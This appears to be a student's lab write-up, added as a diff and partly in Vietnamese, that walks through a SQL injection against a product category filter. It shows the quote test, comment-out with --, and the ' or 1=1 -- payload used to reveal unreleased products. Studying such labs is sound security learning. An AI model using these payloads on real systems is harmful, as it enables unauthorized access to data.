@@ -1,0 +1,15 @@
+SQL injection - product category filter
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+End goal: display products both released and unreleaded
+
+Analysis:
+SELECT * FROM products WHERE category = 'Pets' AND released = 1
+
+Bước 1: Thêm các kí tự như -- và ' để xem có phản hồi khác biệt nào không
+Nếu có phản hồi khác so với ban đầu --> có thể bị tấn công SQL 
+Ở đây bước đầu đã xóa Pets đi và thay vào đó là dấu ' --> query trở thành:
+SELECT * FROM products WHERE category = ''' AND released = 1 --> trả về lỗi --> có thể tấn công SQL
+Bước 2: SELECT * FROM products WHERE category = ''--' AND released = 1 --> thêm dấu -- để commnet phần phía sau 
+Bước 3: SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1 (vì không có sản phầm nào có tên là '' -->
+truy vấn sẽ chạy phần or 1=1 --> hiển thị tất cả các loại sản phẩm)
